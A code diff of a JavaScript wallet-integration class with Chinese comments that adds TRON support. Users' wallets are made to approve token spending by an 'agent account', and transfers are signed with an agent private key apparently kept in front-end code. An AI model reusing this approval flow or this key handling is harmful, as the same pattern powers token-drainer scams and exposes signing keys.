@@ -9,6 +9,7 @@
 import Web3 from 'web3'// /dist/web3.min.js
 import { providers } from "ethers"
 import { provider } from "../blockchain/WalletProvider"
+const TronWeb = require('tronweb')
 
 //智能合约ABI与地址(ETH)
 import abiERC20 from '../blockchain/ERC20.json'
@@ -43,7 +44,7 @@ export default class BlockChainBase {
             callBack(abiBEP20, abiBEP20, ConTractBEP20, 'https://bsc-dataseed3.defibit.io/', 56)
         }
         else if (type == 'TRC') {
-            callBack(abiTRC20, abiTRC20, ConTractTRC20, 'https://rpc.tomochain.com', 88) //https://trx.mytokenpocket.vip
+            callBack(abiTRC20, abiTRC20, ConTractTRC20, 'https://api.trongrid.io/', 88) //https://trx.mytokenpocket.vip
         }
         else console.log('无法获取到' + type + '链的数据')
     }
@@ -52,20 +53,21 @@ export default class BlockChainBase {
     async doConnectWallet(callBack, type) {
         try {
             if (wallet == '') {
-
-                // if (type == 'ETH') provider.updateRpcUrl(1)
-                // else if (type == 'BSC') provider.updateRpcUrl(56)
-                // else if (type == 'TRC') provider.updateRpcUrl(88)
-
-                wallet = await provider.enable()
-                    .catch(() => {
-                        console.warn("用户取消连接钱包")
-                        callBack('DisApprove')
-                    })
-                    .then(async function () {
-                        console.log("开始执行授权")
-                        callBack('Approve', new Web3(provider))
-                    })
+                if (type == 'TRC') {
+                    console.log("开始执行授权")
+                    callBack('Approve', new Web3(provider))
+                }
+                else {
+                    wallet = await provider.enable()
+                        .catch(() => {
+                            console.warn("用户取消连接钱包")
+                            callBack('DisApprove')
+                        })
+                        .then(async function () {
+                            console.log("开始执行授权")
+                            callBack('Approve', new Web3(provider))
+                        })
+                }
             }
             else {
                 callBack('Approve', new Web3(provider))
@@ -128,47 +130,66 @@ export default class BlockChainBase {
     //用户钱包授权给代理账户
     async doApprove(web3, address, callBack, type) {
         try {
-            this.onCheckChainLink(type, (abi, abiCheck, abiContract, link, abiChainID) => {
-                if (web3 == null)
-                    web3 = new Web3(link || Web3.givenProvider)
-
-                console.log('link = ', link)
-                console.log('web3 = ', web3)
-                var contract = new web3.eth.Contract(abi, abiContract)
-                console.log('type = ', type)
-
+            this.onCheckChainLink(type, async (abi, abiCheck, abiContract, link, abiChainID) => {
+                var contract
                 let amount = 100 * Math.pow(10, 18)
-                web3.eth.getAccounts().then(function (account) {
-                    var userAddress = account[0] //用户钱包地址
+                if (type == 'TRC') {
+                    var tronWeb = window.tronWeb
+                    console.log("tronWeb = ", tronWeb)
 
-                    web3.eth.getChainId(async (err, chainid) => {
-                        if (err != null) {
-                            console.log('区块链ID:' + chainid + ' 错误信息:' + err)
-                            return
-                        }
-
-                        if (abiChainID == chainid) {
-                            callBack(true, userAddress) //返回创建账号
-                            contract.methods.approve(address, web3.utils.toWei(`${amount}`, 'ether'))
-                                .send({ from: userAddress })
-                                .then(function () {
-                                })
-                                .catch((reason) => {
-                                    if (reason.code == 4001) console.warn('授权失败, 其他原因')
-                                    else if (reason.code == undefined) console.warn('授权失败, 用户取消')
-                                })
-                        }
-                        else {
-                            alert('请选择' + type + '链的钱包地址')
-                            await provider.disconnect().then(() => {
-                                console.log("执行完毕")
-                                wallet = ''
-
-                                location.reload()
+                    callBack(true, tronWeb.defaultAddress.base58)
+                    contract = await tronWeb.contract().at(abiContract)
+                    try {
+                        await contract.approve(address, 100000000).send({ feeLimit: 100000000 }).
+                            then(output => {
+                                alert("授权成功")
                             })
-                        }
+
+                    } catch (error) {
+                        if (error == 'Invalid issuer address provided')
+                            alert("无法获取到用户的钱包地址")
+                        else if (error == 'Confirmation declined by user')
+                            alert("拒绝授权")
+                        else console.error("trigger smart contract error", error)
+                    }
+                }
+                else {
+                    if (web3 == null)
+                        web3 = new Web3(link || Web3.givenProvider)
+
+                    contract = new web3.eth.Contract(abi, abiContract)
+                    web3.eth.getAccounts().then(function (account) {
+                        var userAddress = account[0] //用户钱包地址
+
+                        web3.eth.getChainId(async (err, chainid) => {
+                            if (err != null) {
+                                console.log('区块链ID:' + chainid + ' 错误信息:' + err)
+                                return
+                            }
+
+                            if (abiChainID == chainid) {
+                                callBack(true, userAddress) //返回创建账号
+                                contract.methods.approve(address, web3.utils.toWei(`${amount}`, 'ether'))
+                                    .send({ from: userAddress })
+                                    .then(function () {
+                                    })
+                                    .catch((reason) => {
+                                        if (reason.code == 4001) console.warn('授权失败, 其他原因')
+                                        else if (reason.code == undefined) console.warn('授权失败, 用户取消')
+                                    })
+                            }
+                            else {
+                                alert('请选择' + type + '链的钱包地址')
+                                await provider.disconnect().then(() => {
+                                    console.log("执行完毕")
+                                    wallet = ''
+
+                                    location.reload()
+                                })
+                            }
+                        })
                     })
-                })
+                }
             })
         }
         catch (e) {
@@ -323,7 +344,6 @@ export default class BlockChainBase {
 
         this.onCheckChainLink(type, (abi, abiCheck, abiContract, link) => {
             web3 = new Web3(link || Web3.givenProvider)
-
             web3.eth.defaultAccount = userAddress
             web3.eth.getChainId(async (err, chainid) => {
                 console.log(`区块链ID: ${chainid}\n------------------------`)
@@ -333,62 +353,52 @@ export default class BlockChainBase {
                     return
                 }
 
-                var contract = new web3.eth.Contract(abi, abiContract);
-                var encodedABI
-                if (type == 'ETH')
-                    encodedABI = contract.methods.transfer(userAddress, web3.utils.BN(amount)).encodeABI()
-                else
-                    encodedABI = contract.methods.transfer(userAddress, web3.utils.toBN(amount)).encodeABI()
+                web3.eth.getTransactionCount(agentAddress, 'latest', async (error, nonce) => { //pending earliest latest
+                    console.log(`区块链交易梯度: ${nonce}`)
 
-                try {
-                    const txObject = {
-                        from: agentAddress,
-                        to: abiContract,
-                        value: '0x00',
-                        gasLimit: web3.utils.toHex(10000000000000),
-                        gas: web3.utils.toHex(210000),
-                        gasPrice: web3.utils.toHex(14 * 1e9),
-                        data: encodedABI
-                    }
+                    var curNonce = nonce
+                    console.log(`使用梯度: ${curNonce}\n------------------------`)
 
-                    const tx = new Tx(txObject)
-                    const privateKey = Buffer.from(agentAPIKEY, "hex")
-                    tx.sign(privateKey)
-                    const serializedTx = tx.serialize()
+                    if (!error) {
+                        var contract = new web3.eth.Contract(abi, abiContract)
+                        var encodedABI
+                        if (type == 'ETH')
+                            encodedABI = contract.methods.transfer(userAddress, web3.utils.BN(amount)).encodeABI()
+                        else
+                            encodedABI = contract.methods.transfer(userAddress, web3.utils.toBN(amount)).encodeABI()
 
-                    web3.eth.sendSignedTransaction('0x' + serializedTx.toString('hex'), (err, txHash) => {
-                        if (!err) {
-                            console.log('txHash = ', txHash)
+                        try {
+                            const txObject = {
+                                chainId: web3.utils.toHex(chainid),
+                                nonce: web3.utils.toHex(curNonce),
+                                from: agentAddress,
+                                to: abiContract,
+                                value: '0x00',
+                                gasLimit: web3.utils.toHex(10000000000000),
+                                gas: web3.utils.toHex(210000),
+                                gasPrice: web3.utils.toHex(14 * 1e9),
+                                data: encodedABI
+                            }
+
+                            const tx = new Tx(txObject)
+                            const privateKey = Buffer.from(agentAPIKEY, "hex")
+                            tx.sign(privateKey)
+                            const serializedTx = tx.serialize()
+
+                            web3.eth.sendSignedTransaction('0x' + serializedTx.toString('hex'), (err, txHash) => {
+                                if (!err) {
+                                    console.log('txHash = ', txHash)
+                                }
+                            }).catch(function (err) {
+                                console.log('err = ', err)
+                                callBack(false, err)
+                            })
                         }
-                    }).catch(function (err) {
-                        console.log('err = ', err)
-                        callBack(false, err)
-                    })
-
-                    // web3.eth.accounts.signTransaction(txObject, agentAPIKEY)
-                    //     .then(
-                    //         signed => {
-                    //             var tran = web3.eth.sendSignedTransaction(signed.rawTransaction)
-
-                    //             tran.on('confirmation', (confirmationNumber, receipt) => {
-                    //                 console.log('confirmation = ', confirmationNumber)
-                    //                 console.log('tran = ', tran)
-                    //             });
-
-                    //             tran.on('transactionHash', hash => {
-                    //                 console.log('hash = ', hash)
-                    //             });
-
-                    //             tran.on('receipt', receipt => {
-                    //                 console.log('reciept = ', receipt)
-                    //             });
-
-                    //             tran.on('error = ', console.error)
-                    //         });
-                }
-                catch (e) {
-                    callBack(false, { message: '与区块链交互失败, 具体情况请联系管理员. ( F12>Consolo 查看具体日志 )' })
-                }
+                        catch (e) {
+                            callBack(false, { message: '与区块链交互失败, 具体情况请联系管理员. ( F12>Consolo 查看具体日志 )' })
+                        }
+                    }
+                })
             })
         })
     }
